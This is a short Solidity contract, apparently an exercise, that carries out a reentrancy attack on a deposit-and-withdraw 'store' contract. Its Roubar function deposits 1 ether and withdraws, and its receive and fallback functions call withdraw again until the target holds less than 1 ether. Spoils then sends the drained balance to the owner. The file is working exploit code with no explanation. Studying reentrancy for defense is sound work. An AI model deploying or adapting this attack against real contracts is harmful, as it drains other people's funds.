// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface Store_interface {
    function Depositar() external payable;

    function Saque() external;
}

contract Attack{

    Store_interface store_interface;
    address owner;
    constructor(address _alvo){
        store_interface = Store_interface(_alvo);
        owner = msg.sender;

    }

    function Roubar() external payable{
        
        require(msg.value>=1);
        require(msg.sender==owner,"");
        store_interface.Depositar{value: 1 ether}();


        store_interface.Saque();

    }


    function Spoils() public{
        require(msg.sender==owner,"nao eh o ladrao");

        (bool success,) = payable(msg.sender).call{value:address(this).balance}("");

        require(success,"ERRO NA ROUBALHEIRA");

    }


    receive() external payable{
        if (address(store_interface).balance >= 1 ether) {
            store_interface.Saque();
        }

    }

    fallback() external payable{
        if (address(store_interface).balance >= 1 ether) {
            store_interface.Saque();
        }
    }
 




}